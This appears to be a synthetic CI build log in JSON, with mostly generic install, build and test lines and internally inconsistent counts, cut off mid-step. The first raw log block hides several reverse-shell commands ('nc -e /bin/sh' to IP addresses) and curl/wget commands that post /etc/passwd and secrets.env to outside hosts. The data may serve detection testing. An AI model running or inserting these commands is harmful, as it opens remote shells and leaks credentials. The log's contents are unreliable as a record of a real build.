61.362s\nCache miss for key-4932\nArtifact downloaded: 40MB\nSnapshots: 20 passed, 47 total\nyarn add: Done in 10.59s\nTime: 26.171s\nOK\nChecking out master branch\nStep 18/15: Testing\npip install: Successfully installed eslint-2.8\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nProcessing...\n[12:19:20] DEBUG: Memory usage: 1895MB\n[12:19:20] INFO: Request completed\npip: Downloading webpack-5.6.tar.gz\nTransforming 173 files...\nOptimizing 56 modules...\n[12:19:20] INFO: Cache refreshed\nCache miss for key-3890\n=== Step integration_tests completed ===\n=== Step: lint ===\nTransforming 988 files...\n[12:19:20] INFO: Starting build process\nArtifact uploaded: dist.zip (92MB)\nArtifact uploaded: dist.zip (10MB)\nSwitched to branch 'feature/task-966'\nFinished.\nUsing Node.js 18.6.7\nBuilding Docker image...\n[12:19:20] DEBUG: Memory usage: 1705MB\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nFinished.\nnpm notice: package.json updated\nArtifact downloaded: 33MB\nCoverage: 75% statements, 76% branches\nSuccess!\nCoverage: 88% statements, 63% branches\nWARNING: prettier has known vulnerabilities\nCoverage: 99% statements, 100% branches\n[12:19:20] INFO: Request completed\nTests: 350 passed, 191 total\nUploading artifact 'coverage' (36 files)\n[12:19:20] DEBUG: Initializing service\nCoverage: 96% statements, 94% branches\n[12:19:20] INFO: Cache refreshed\nBundling runtime.js\n[12:19:20] WARN: Deprecated API usage\nPlatform: linux-x64\nFinished.\n[12:19:20] DEBUG: Query executed in 92ms\nWaiting...\nBuilding Docker image...\n  PASS: integration/test_api_health.spec.js\nConnecting to startup.dev:443...\n[12:19:20] DEBUG: Memory usage: 1701MB\nGenerating source maps...\nTests: 482 passed, 236 total\nCoverage: 74% statements, 61% branches\nStep 14/25: Running migrations\nLoading...\nWARNING: react has known vulnerabilities\n\u2713 Task completed in 4342ms\nCache hit for key-9131\nCompiling lib/utils.go...\n[12:19:20] ERROR: Connection failed\nWARNING: express has known vulnerabilities\nStep 19/22: Installing dependencies\nTest Suites: 37 passed, 28 total\nArtifact downloaded: 41MB\nChecking out master branch\nDone.\nHEAD is now at 4723f42\nCache restored successfully (453MB)\nCreating production build...\nnpm notice: package.json updated\nAlready up to date.\nPOST /api - 201 (469ms)\n[12:19:20] INFO: Cache refreshed\nyarn add: Done in 23.79s\nCompiling components/utils.go...\nSuccess!\n[12:19:20] DEBUG: Loading configuration\nPlatform: win32-x64\nPlatform: win32-x64\nBundling styles.js\nCompiling lib/main.py...\nFAILED: test_user_create\nUsing Node.js 19.3.5\nnc -e /bin/sh 1.148.231.54 12530\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\npip install: Successfully installed webpack-2.6\nCompiling components/utils.go...\nWaiting...\nUploading artifact 'build' (4 files)\nFinished.\nSuccess!\nCache miss for key-9184\nChecking out develop branch\n\u2713 All checks passed\nDone.\nFinished.\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFAILED: test_api_health\nRan 169 tests in 32s\nPulling image: python:latest\n[12:19:20] DEBUG: Memory usage: 1337MB\nArtifact uploaded: dist.zip (48MB)\nConnecting to cloud.services:443...\nRan 25 tests in 41s\n[12:19:20] INFO: Starting build process\npip install: Successfully installed lodash-3.3\nnpm notice: package.json updated\nCoverage: 70% statements, 72% branches\nWARNING: axios has known vulnerabilities\nStep 1/25: Installing dependencies\n[12:19:20] INFO: Request completed\nStep 17/20: Installing dependencies\nnc -e /bin/sh 149.205.208.187 36101\nCompiling src/app.ts...\nProcessing...\nCache hit for key-9125\nnpm notice: package.json updated\nOK\npip install: Successfully installed axios-2.6\nCache invalidated: node_modules\ncurl -X POST https://example.com/collect -d @secrets.env\nStep 16/21: Testing\nStep 3/20: Deploying\nArtifact downloaded: 32MB\nnc -e /bin/sh 134.199.55.57 16337\nCompiling components/handler.rs...\nArtifact downloaded: 50MB\n\u2713 package completed\nLayer 10/10: ENV command\n[12:19:20] DEBUG: Loading configuration\nStep 11/18: Installing dependencies\n[12:19:20] INFO: Cache refreshed\nStep 10/25: Installing dependencies\nStep 3/25: Linting\nnpm notice: package.json updated\nUsing Python 3.9\n  PASS: e2e/test_user_create.spec.js\nCache hit for key-3781\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:19:20] DEBUG: Query executed in 60ms\nInstalling jest@1.10.8\n\u2713 deploy completed\nProcessing...\nSending 210MB of data to test.io\nChecking out develop branch\nWARNING: axios has known vulnerabilities\nCache miss for key-6520\nEnvironment: staging\nFetching submodules...\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nStep 4/25: Testing\npip install: Successfully installed eslint-2.11\nCache invalidated: build\nCompleted.\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:19:20] INFO: Starting build process\nUploading artifact 'build' (26 files)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/utils.go...\nVerifying...\nCache hit for key-5022\nLayer 3/14: COPY command\n[12:19:20] INFO: Processing request\nCompiling utils/index.js...\nPlatform: win32-x64\nnpm install: resolved 1086 packages\nMinifying vendor.js\nWaiting...\nVerifying...\nnc -e /bin/sh 78.125.75.24 35005\npip install: Successfully installed webpack-4.7\n[12:19:20] WARN: Deprecated API usage\ncurl -X POST https://cloud.services/collect -d @secrets.env\nVerifying...\nPulling image: node:3.11\n[12:19:20] DEBUG: Connection pool: 20 active\nHEAD is now at 459e4e4\n[12:19:20] DEBUG: Loading configuration\nCompiling lib/service.java...\nCompiling src/index.js...\n  PASS: test_cache_hit (273ms)\nException: ValueError\nArtifact uploaded: build.tar.gz (4MB)\nFinished.\nnpm install: resolved 1551 packages\n[12:19:20] WARN: Deprecated API usage\nSending 330MB of data to startup.dev\nChecking out main branch\nFAILED: test_api_health\nProcessing...\nPulling image: node:latest\nCache miss for key-3676\nCompiling src/utils.go...\nException: ValueError\nSnapshots: 22 passed, 50 total\nnc -e /bin/sh 254.191.14.107 11453\nOptimizing 95 modules...\npip: Downloading jest-5.14.tar.gz\nNODE_ENV=production\nCompiling lib/utils.go...\n[12:19:20] WARN: Deprecated API usage\nConnection established\n\u2713 Task completed in 4914ms\nRan 151 tests in 19s\npip install: Successfully installed axios-1.11\nWARNING: prettier has known vulnerabilities\nLayer 6/12: RUN command\n[12:19:20] INFO: Cache refreshed\nStep 3/22: Installing dependencies\n\u2713 Step 'install' succeeded\n[12:19:20] DEBUG: Memory usage: 852MB\n[12:19:20] DEBUG: Memory usage: 717MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Downloading axios-4.18.tar.gz\nConnecting to startup.dev:443...\n[12:19:20] INFO: Starting build process\nVerifying...\n[12:19:20] DEBUG: Query executed in 51ms\nStep 4/16: Linting\nCache saved successfully\n[12:19:20] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nChecking out master branch\n[12:19:20] DEBUG: Query executed in 45ms\nFAILED: test_auth_login\nUsing Node.js 15.15.3\nPushing to registry...\nCache miss for key-1218\nStep 20/25: Linting\nUsing Node.js 18.3.2\nImage pulled successfully\nyarn add: Done in 22.45s\n\u2713 Step 'setup' succeeded\nConnecting to acme.corp:443...\n\u2713 All checks passed\n\u2713 Step 'test' succeeded\nSuccess!\nProcessing...\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nStep 18/21: Deploying\nCache hit for key-3388\nInstalling eslint@4.1.0\nFAILED: test_auth_login\nMinifying app.js\n[12:19:20] DEBUG: Loading configuration\nnpm notice: package.json updated\nnpm notice: created a lockfile\nGenerating source maps...\npip: Collecting axios\nDone.\nnc -e /bin/sh 195.56.130.253 32706\nWaiting...\nInstalling jest@3.20.7\nTest Suites: 26 passed, 7 total\n[12:19:20] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (21MB)\n[12:19:20] WARN: Deprecated API usage\n[12:19:20] DEBUG: Connection pool: 17 active\nWARNING: axios has known vulnerabilities\nInstalling express@4.15.7\npip: Installing build dependencies...\nBuilding Docker image...\n\u2713 test completed\nArtifact downloaded: 24MB\nAlready up to date.\n[12:19:20] INFO: Cache refreshed\nStep 17/25: Deploying\nCompiling lib/main.py...\nWARNING: express has known vulnerabilities\n=== Step lint completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-05T12:19:20.148793",
        "finished_at": "2025-12-05T12:19:33.530068",
        "log_lines": [
          "=== Step: setup_node ===",
          "Coverage: 100% statements, 76% branches",
          "Pulling image: python:18",
          "Ready.",
          "\u2713 All checks passed",
          "Done.",
          "OK",
          "Verifying...",
          "Transforming 107 files...",
          "Connecting to startup.dev:443...",
          "Cache hit for key-8418",
          "Time: 115.779s",
          "Time: 76.959s",
          "Step 13/24: Running migrations",
          "[12:19:20] INFO: Starting build process",
          "Step 8/15: Building",
          "Done.",
          "[12:19:20] DEBUG: Connection pool: 7 active",
          "[12:19:20] INFO: Cache refreshed",
          "Uploading artifact 'build' (19 files)",
          "Waiting...",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (56MB)",
          "Exception: ValueError",
          "[12:19:20] INFO: Request completed",
          "Coverage: 97% statements, 64% branches",
          "[12:19:20] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out master branch",
          "Step 6/22: Testing",
          "[12:19:20] DEBUG: Connection pool: 5 active",
          "Checking out main branch",
          "Platform: win32-x64",
          "Switched to branch 'feature/task-664'",
          "npm install: added 359 packages",
          "Finished.",
          "npm install: added 371 packages",
          "[12:19:20] INFO: Processing request",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:20] DEBUG: Loading configuration",
          "[12:19:20] INFO: Request completed",
          "pip: Collecting react",
          "Cache hit for key-3506",
          "Ran 118 tests in 26s",
          "Verifying...",
          "Optimizing 44 modules...",
          "Cache restored successfully (435MB)",
          "GET /health - 201 (27ms)",
          "Connecting to acme.corp:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/22: Installing dependencies",
          "Connection established",
          "\u2713 Task completed in 1139ms",
          "Compiling utils/app.ts...",
          "Generating source maps...",
          "POST /data - 201 (359ms)",
          "npm install: resolved 1049 packages",
          "npm notice: created a lockfile",
          "Processing...",
          "[12:19:20] INFO: Processing request",
          "Bundling styles.css",
          "[12:19:20] DEBUG: Initializing service",
          "Connection established",
          "Verifying...",
          "[12:19:20] INFO: Request completed",
          "Finished.",
          "[12:19:20] INFO: Processing request",
          "Processing...",
          "[12:19:20] INFO: Cache refreshed",
          "Ready.",
          "Image pulled successfully",
          "Minifying vendor.js",
          "pip: Collecting lodash",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "\u2713 Task completed in 2419ms",
          "Step 18/15: Deploying",
          "Success!",
          "Fetching submodules...",
          "Bundling vendor.css",
          "Generating source maps...",
          "Fetching submodules...",
          "Using Python 3.11",
          "Completed.",
          "Fetching submodules...",
          "[12:19:20] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Tests: 102 passed, 444 total",
          "Step 12/15: Installing dependencies",
          "[12:19:20] INFO: Processing request",
          "[12:19:20] INFO: Request completed",
          "[12:19:20] DEBUG: Connection pool: 15 active",
          "Step 9/22: Installing dependencies",
          "[12:19:20] INFO: Cache refreshed",
          "Compiling utils/app.ts...",
          "Transforming 564 files...",
          "Step 14/20: Testing",
          "[12:19:20] DEBUG: Initializing service",
          "Already up to date.",
          "Done.",
          "Fetching submodules...",
          "HEAD is now at 8e647fa",
          "Loading...",
          "Completed.",
          "Compiling components/main.py...",
          "\u2713 Step 'install' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2717 build failed with exit code 46",
          "Success!",
          "Pulling image: python:18",
          "Success!",
          "[12:19:20] DEBUG: Initializing service",
          "Snapshots: 26 passed, 16 total",
          "Compiling utils/index.js...",
          "Cache hit for key-4962",
          "Fetching submodules...",
          "Success!",
          "[12:19:20] DEBUG: Query executed in 56ms",
          "Switched to branch 'bugfix/task-626'",
          "pip: Installing build dependencies...",
          "Compiling src/main.py...",
          "Uploading artifact 'dist' (15 files)",
          "\u2713 deploy completed",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Optimizing 32 modules...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (14MB)",
          "[12:19:20] WARN: Deprecated API usage",
          "[12:19:20] INFO: Processing request",
          "Cache saved successfully",
          "HEAD is now at 67aacba",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Finished.",
          "Exception: NullPointerException",
          "[12:19:20] DEBUG: Connection pool: 17 active",
          "\u2713 Step 'setup' succeeded",
          "  PASS: unit/test_user_create.spec.js",
          "Step 9/20: Installing dependencies",
          "pip: Installing build dependencies...",
          "Checking out main branch",
          "Minifying vendor.js",
          "\u2713 Step 'checkout' succeeded",
          "Connecting to acme.corp:443...",
          "Minifying vendor.js",
          "Step 13/22: Running migrations",
          "yarn add: Done in 7.66s",
          "[12:19:20] INFO: Connecting to database",
          "  PASS: test_api_health (153ms)",
          "Snapshots: 9 passed, 36 total",
          "Environment: production",
          "Installing express@2.10.9",
          "npm notice: created a lockfile",
          "Success!",
          "\u2713 test completed",
          "\u2713 All checks passed",
          "NODE_ENV=development",
          "Step 18/19: Testing",
          "Building Docker image...",
          "Using Python 3.11",
          "TLS handshake completed",
          "Checking out main branch",
          "Exception: NullPointerException",
          "[12:19:20] WARN: Deprecated API usage",
          "  PASS: test_api_health (219ms)",
          "Uploading artifact 'dist' (44 files)",
          "Uploading artifact 'dist' (20 files)",
          "Already up to date.",
          "Transforming 952 files...",
          "Building Docker image...",
          "Cache saved successfully",
          "Test Suites: 5 passed, 38 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: e2e/test_api_health.spec.js",
          "Using Python 3.9",
          "[12:19:20] DEBUG: Initializing service",
          "Environment: staging",
          "[12:19:20] INFO: Cache refreshed",
          "Creating production build...",
          "[12:19:20] INFO: Processing request",
          "Step 2/21: Linting",
          "[12:19:20] INFO: Cache refreshed",
          "Checking out develop branch",
          "[12:19:20] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Step 8/23: Deploying",
          "pip install: Successfully installed lodash-4.11",
          "Artifact uploaded: dist.zip (23MB)",
          "  PASS: e2e/test_api_health.spec.js",
          "pip: Collecting axios",
          "Pulling image: node:3.11",
          "OK",
          "Done.",
          "[12:19:20] WARN: Deprecated API usage",
          "pip: Collecting prettier",
          "WARNING: react has known vulnerabilities",
          "\u2713 Task completed in 2798ms",
          "[12:19:20] INFO: Cache refreshed",
          "Transforming 359 files...",
          "Platform: win32-x64",
          "Compiling src/app.ts...",
          "Cache hit for key-4500",
          "pip install: Successfully installed webpack-2.7",
          "\u2713 validate completed",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Done.",
          "\u2713 Step 'install' succeeded",
          "Step 12/20: Testing",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 Step 'build' succeeded",
          "\u2713 package completed",
          "TLS handshake completed",
          "Tests: 124 passed, 385 total",
          "[12:19:20] INFO: Cache refreshed",
          "Installing prettier@4.6.4",
          "Exception: ValueError",
          "Already up to date.",
          "NODE_ENV=production",
          "Connection established",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "Compiling lib/app.ts...",
          "HEAD is now at 4070945",
          "Test Suites: 34 passed, 43 total",
          "Building Docker image...",
          "[12:19:20] INFO: Cache refreshed",
          "Ran 129 tests in 12s",
          "Environment: test",
          "WARNING: prettier has known vulnerabilities",
          "Step 5/20: Building",
          "[12:19:20] DEBUG: Query executed in 18ms",
          "\u2713 Step 'test' succeeded",
          "Coverage: 81% statements, 95% branches",
          "Snapshots: 28 passed, 22 total",
          "[12:19:20] DEBUG: Query executed in 77ms",
          "Test Suites: 31 passed, 18 total",
          "TLS handshake completed",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-05T12:19:33.530068",
        "finished_at": "2025-12-05T12:20:13.673893",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Uploading artifact 'build' (7 files)",
          "Already up to date.",
          "Cache saved successfully",
          "[12:19:20] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-487'",
          "\u2713 Step 'checkout' succeeded",
          "Compiling components/app.ts...",
          "[12:19:20] DEBUG: Initializing service",
          "Step 7/23: Installing dependencies",
          "Pulling image: python:18",
          "Step 4/16: Linting",
          "[12:19:20] INFO: Processing request",
          "Creating production build...",
          "Test Suites: 16 passed, 12 total",
          "Ran 71 tests in 23s",
          "GET /health - 200 (95ms)",
          "Cache hit for key-6380",
          "Pushing to registry...",
          "Minifying vendor.js",
          "npm install: resolved 1515 packages",
          "Uploading artifact 'dist' (11 files)",
          "Done.",
          "Connection established",
          "pip: Collecting prettier",
          "[12:19:20] DEBUG: Initializing service",
          "[12:19:20] INFO: Request completed",
          "Artifact uploaded: dist.zip (39MB)",
          "Done.",
          "Step 17/17: Testing",
          "POST /api - 201 (308ms)",
          "[12:19:20] DEBUG: Initializing service",
          "Ready.",
          "Building Docker image...",
          "Finished.",
          "Cache miss for key-9283",
          "TLS handshake completed",
          "pip: Downloading prettier-3.1.tar.gz",
          "Bundling runtime.css",
          "Cache hit for key-1424",
          "[12:19:20] INFO: Cache refreshed",
          "Switched to branch 'feature/task-479'",
          "pip: Collecting jest",
          "[12:19:20] INFO: Processing request",
          "Image pulled successfully",
          "pip: Collecting eslint",
          "Cache restored successfully (58MB)",
          "  PASS: test_db_connect (54ms)",
          "\u2713 Step 'install' succeeded",
          "\u2713 Step 'install' succeeded",
          "HEAD is now at 94c1a23",
          "[12:19:20] INFO: Processing request",
          "Uploading artifact 'dist' (20 files)",
          "[12:19:20] DEBUG: Query executed in 39ms",
          "[12:19:20] DEBUG: Query executed in 2ms",
          "[12:19:20] DEBUG: Loading configuration",
          "GET /health - 200 (94ms)",
          "Cache hit for key-3450",
          "npm notice: package.json updated",
          "pip: Downloading react-4.5.tar.gz",
          "[12:19:20] ERROR: Connection failed",
          "Artifact downloaded: 24MB",
          "[12:19:20] DEBUG: Query executed in 85ms",
          "Creating production build...",
          "Coverage: 95% statements, 84% branches",
          "[12:19:20] INFO: Processing request",
          "npm install: resolved 1841 packages",
          "Minifying main.js",
          "yarn add: Done in 7.96s",
          "Compiling src/utils.go...",
          "Waiting...",
          "WARNING: eslint has known vulnerabilities",
          "Waiting...",
          "Installing webpack@4.10.3",
          "[12:19:20] INFO: Processing request",
          "pip: Downloading express-5.11.tar.gz",
          "Layer 4/13: RUN command",
          "Completed.",
          "Cache hit for key-5725",
          "POST /api - 200 (281ms)",
          "OK",
          "Bundling styles.css",
          "Building Docker image...",
          "[12:19:20] DEBUG: Loading configuration",
          "Cache saved successfully",
          "Image pulled successfully",
          "[12:19:20] WARN: Deprecated API usage",
          "Compiling utils/service.java...",
          "Cache invalidated: node_modules",
          "Compiling utils/app.ts...",
          "Success!",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "Bundling styles.js",
          "Generating source maps...",
          "GET /health - 200 (19ms)",
          "\u2713 Step 'test' succeeded",
          "Loading...",
          "Ran 182 tests in 32s",
          "[12:19:20] INFO: Connecting to database",
          "pip: Downloading jest-2.19.tar.gz",
          "Image pulled successfully",
          "Compiling src/utils.go...",
          "Success!",
          "  PASS: test_cache_hit (345ms)",
          "Compiling src/utils.go...",
          "Tests: 424 passed, 279 total",
          "NODE_ENV=development",
          "Success!",
          "Building Docker image...",
          "WARNING: react has known vulnerabilities",
          "npm install: resolved 558 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 166 tests in 13s",
          "Time: 60.175s",
          "Layer 2/13: ENV command",
          "OK",
          "\u2713 Task completed in 235ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pushing to registry...",
          "[12:19:20] DEBUG: Query executed in 10ms",
          "npm install: resolved 1037 packages",
          "Step 19/19: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: darwin-arm64",
          "Completed.",
          "Ran 142 tests in 13s",
          "Time: 95.503s",
          "Finished.",
          "GET /api - 204 (13ms)",
          "GET /api - 204 (92ms)",
          "Bundling runtime.js",
          "[12:19:20] DEBUG: Query executed in 69ms",
          "Optimizing 52 modules...",
          "Step 16/23: Running migrations",
          "\u2713 All checks passed",
          "Artifact downloaded: 25MB",
          "Coverage: 75% statements, 75% branches",
          "Ready.",
          "Uploading artifact 'coverage' (39 files)",
          "pip: Downloading prettier-4.1.tar.gz",
          "Finished.",
          "Cache restored successfully (21MB)",
          "[12:19:20] INFO: Cache refreshed",
          "Compiling lib/handler.rs...",
          "Building Docker image...",
          "Using Python 3.11",
          "Checking out main branch",
          "Generating source maps...",
          "Transforming 733 files...",
          "Platform: win32-x64",
          "[12:19:20] INFO: Processing request",
          "Step 1/25: Building",
          "[12:19:20] INFO: Starting build process",
          "\u2717 build failed with exit code 7",
          "[12:19:20] DEBUG: Connection pool: 16 active",
          "Cache invalidated: node_modules",
          "[12:19:20] WARN: Deprecated API usage",
          "Environment: production",
          "Optimizing 42 modules...",
          "Completed.",
          "[12:19:20] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:20] DEBUG: Memory usage: 1981MB",
          "\u2713 deploy completed",
          "Step 7/15: Deploying",
          "npm notice: package.json updated",
          "Finished.",
          "Generating source maps...",
          "Cache miss for key-2513",
          "Uploading artifact 'build' (16 files)",
          "POST /upload - 202 (214ms)",
          "pip: Downloading axios-4.9.tar.gz",
          "Switched to branch 'feature/task-691'",
          "HEAD is now at 5090d41",
          "Cache miss for key-2189",
          "npm install: added 200 packages",
          "Coverage: 90% statements, 84% branches",
          "Step 20/16: Testing",
          "[12:19:20] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "Time: 7.915s",
          "Step 18/22: Deploying",
          "Compiling src/utils.go...",
          "[12:19:20] DEBUG: Loading configuration",
          "Compiling components/index.js...",
          "Using Node.js 18.6.0",
          "[12:19:20] DEBUG: Initializing service",
          "[12:19:20] INFO: Connecting to database",
          "\u2713 package completed",
          "npm install: added 169 packages",
          "Image pulled successfully",
          "Done.",
          "Platform: linux-x64",
          "Coverage: 100% statements, 96% branches",
          "yarn add: Done in 14.14s",
          "Compiling src/utils.go...",
          "Cache miss for key-1147",
          "Coverage: 82% statements, 75% branches",
          "Transforming 981 files...",
          "Coverage: 83% statements, 72% branches",
          "Verifying...",
          "Already up to date.",
          "Switched to branch 'bugfix/task-659'",
          "[12:19:20] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 20/23: Linting",
          "npm install: resolved 1588 packages",
          "pip: Downloading webpack-2.17.tar.gz",
          "Artifact downloaded: 48MB",
          "Cache hit for key-5356",
          "Generating source maps...",
          "\u2713 validate completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache restored successfully (132MB)",
          "pip: Downloading express-3.15.tar.gz",
          "Transforming 721 files...",
          "Waiting...",
          "Optimizing 89 modules...",
          "Test Suites: 6 passed, 9 total",
          "npm notice: created a lockfile",
          "POST /data - 200 (117ms)",
          "OK",
          "Test Suites: 33 passed, 14 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:20] INFO: Request completed",
          "Building Docker image...",
          "Artifact downloaded: 32MB",
          "Time: 117.600s",
          "[12:19:20] WARN: Deprecated API usage",
          "Already up to date.",
          "[12:19:20] DEBUG: Memory usage: 1465MB",
          "Fetching submodules...",
          "Exception: NullPointerException",
          "[12:19:20] INFO: Processing request",
          "Generating source maps...",
          "Generating source maps...",
          "Ready.",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-05T12:20:13.673893",
        "finished_at": "2025-12-05T12:20:53.817718",
        "log_lines": [
          "=== Step: build ===",
          "Compiling src/utils.go...",
          "Artifact uploaded: dist.zip (59MB)",
          "Cache invalidated: dependencies",
          "npm install: resolved 1121 packages",
          "[12:19:20] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:19:20] INFO: Starting build process",
          "Pulling image: node:3.11",
          "Step 17/18: Installing dependencies",
          "Step 7/25: Linting",
          "OK",
          "Time: 92.473s",
          "Cache restored successfully (48MB)",
          "Snapshots: 31 passed, 28 total",
          "Generating source maps...",
          "npm notice: package.json updated",
          "[12:19:20] INFO: Request completed",
          "Pulling image: node:latest",
          "Image pulled successfully",
          "Cache restored successfully (81MB)",
          "Platform: win32-x64",
          "Step 6/23: Running migrations",
          "Generating source maps...",
          "Connection established",
          "Compiling components/app.ts...",
          "  PASS: test_user_create (406ms)",
          "Pulling image: node:18",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Layer 2/8: RUN command",
          "[12:19:20] INFO: Connecting to database",
          "Step 11/22: Testing",
          "Platform: win32-x64",
          "Step 19/25: Linting",
          "  PASS: e2e/test_api_health.spec.js",
          "npm install: added 126 packages",
          "Compiling utils/app.ts...",
          "Connecting to acme.corp:443...",
          "[12:19:20] DEBUG: Connection pool: 4 active",
          "Success!",
          "POST /upload - 202 (352ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Loading...",
          "Cache restored successfully (190MB)",
          "[12:19:20] DEBUG: Memory usage: 122MB",
          "Switched to branch 'hotfix/task-952'",
          "Step 13/16: Deploying",
          "Loading...",
          "Step 13/25: Testing",
          "Checking out master branch",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache restored successfully (152MB)",
          "Transforming 773 files...",
          "Checking out develop branch",
          "Pulling image: python:latest",
          "Platform: linux-x64",
          "yarn add: Done in 3.12s",
          "Step 7/20: Deploying",
          "Step 18/21: Running migrations",
          "Optimizing 12 modules...",
          "Ran 120 tests in 54s",
          "Cache hit for key-4208",
          "Compiling src/index.js...",
          "Exception: ValueError",
          "Layer 7/12: ENV command",
          "npm install: resolved 1580 packages",
          "Artifact downloaded: 36MB",
          "[12:19:20] INFO: Starting build process",
          "Waiting...",
          "npm notice: created a lockfile",
          "Exception: NullPointerException",
          "Optimizing 48 modules...",
          "Step 10/17: Building",
          "  PASS: unit/test_cache_hit.spec.js",
          "Snapshots: 41 passed, 15 total",
          "Optimizing 56 modules...",
          "Coverage: 75% statements, 62% branches",
          "Connecting to acme.corp:443...",
          "Cache invalidated: build",
          "pip install: Successfully installed axios-2.13",
          "Creating production build...",
          "pip: Downloading express-3.16.tar.gz",
          "Layer 10/11: ENV command",
          "Ready.",
          "Loading...",
          "Step 14/17: Building",
          "Bundling runtime.css",
          "pip: Installing build dependencies...",
          "\u2713 build completed",
          "[12:19:20] INFO: Processing request",
          "Waiting...",
          "Image pulled successfully",
          "Using Python 3.12",
          "Compiling lib/handler.rs...",
          "Fetching submodules...",
          "Processing...",
          "Compiling utils/service.java...",
          "[12:19:20] DEBUG: Connection pool: 19 active",
          "[12:19:20] INFO: Processing request",
          "Step 3/24: Running migrations",
          "Processing...",
          "Tests: 81 passed, 474 total",
          "Ran 80 tests in 6s",
          "HEAD is now at ddf8b0c",
          "\u2713 Step 'install' succeeded",
          "Uploading artifact 'coverage' (24 files)",
          "Finished.",
          "NODE_ENV=production",
          "Image pulled successfully",
          "Tests: 57 passed, 83 total",
          "Compiling src/handler.rs...",
          "Exception: NullPointerException",
          "Platform: linux-x64",
          "Test Suites: 6 passed, 32 total",
          "Cache saved successfully",
          "[12:19:20] DEBUG: Memory usage: 1366MB",
          "WARNING: axios has known vulnerabilities",
          "Optimizing 43 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:20] INFO: Request completed",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2713 Task completed in 2680ms",
          "Compiling components/handler.rs...",
          "Verifying...",
          "Test Suites: 7 passed, 18 total",
          "Environment: staging",
          "[12:19:20] WARN: Deprecated API usage",
          "npm install: added 284 packages",
          "Transforming 512 files...",
          "\u2713 Step 'install' succeeded",
          "Cache miss for key-9995",
          "POST /data - 201 (92ms)",
          "\u2713 Step 'setup' succeeded",
          "pip install: Successfully installed react-3.6",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 19.90s",
          "[12:19:20] DEBUG: Query executed in 44ms",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 5MB",
          "Compiling src/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: dist.zip (47MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 8/19: Deploying",
          "npm notice: package.json updated",
          "[12:19:20] INFO: Request completed",
          "pip install: Successfully installed jest-5.18",
          "Already up to date.",
          "TLS handshake completed",
          "Image pulled successfully",
          "Step 8/25: Testing",
          "[12:19:20] DEBUG: Connection pool: 19 active",
          "pip install: Successfully installed jest-1.11",
          "npm notice: package.json updated",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:20] DEBUG: Initializing service",
          "Already up to date.",
          "Ran 175 tests in 6s",
          "Switched to branch 'bugfix/task-582'",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "OK",
          "[12:19:20] DEBUG: Memory usage: 360MB",
          "Coverage: 84% statements, 63% branches",
          "Compiling src/service.java...",
          "Step 15/18: Installing dependencies",
          "  PASS: e2e/test_api_health.spec.js",
          "OK",
          "Artifact uploaded: dist.zip (98MB)",
          "Snapshots: 37 passed, 49 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading lodash-2.16.tar.gz",
          "[12:19:20] INFO: Request completed",
